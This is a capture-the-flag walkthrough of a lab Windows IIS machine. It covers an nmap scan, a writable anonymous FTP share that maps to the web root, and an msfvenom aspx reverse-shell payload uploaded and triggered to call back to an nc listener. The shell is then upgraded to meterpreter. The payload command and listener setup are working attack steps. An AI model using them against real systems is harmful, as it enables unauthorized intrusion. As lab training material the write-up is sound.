# Solution

Usual nmap scan
```
> nmap -sC -sV -oN nmap-initial 10.10.10.5
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see port 21 open with an anonymous login. We also see a web server.  
First we visit the web server. It contains a reference to Microsoft iis website, nothing interesting.  

We have write permission on the directory accessible with ftp. In addition we notice that ftp and the web server share the same root directory. It means that we can transfer a file through ftp and execute it by visiting the corresponding url.  
We try with a php reverse shell but it doesn't work. It's likely that there are some kind of checks on the file format and extension. We try to bypass the check in different ways.  

We managed to have a reverse shell by using a aspx reverse shell.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=1234 -f aspx -o shell.aspx
```

Setting up the listener.
```
nc -lnvp 1234
```

By visiting http://10.10.10.5/shell.aspx we have a connection to the local 1234 port.  

To work in a more confortable environment we set up a metasploit handler (multi/handler) and we run the listener.  We have a windows shell now. We can upgrade the shell to a meterpreter shell using the post module multi/manage/shell_to_meterpreter.  
We know have a meterpreter shell with the web service privileges.
(I tried first to get the meterpreter shell by diretly uploading the windows/meterpreter/reverse_tcp payload to the web server but it produced some errors when executed).  




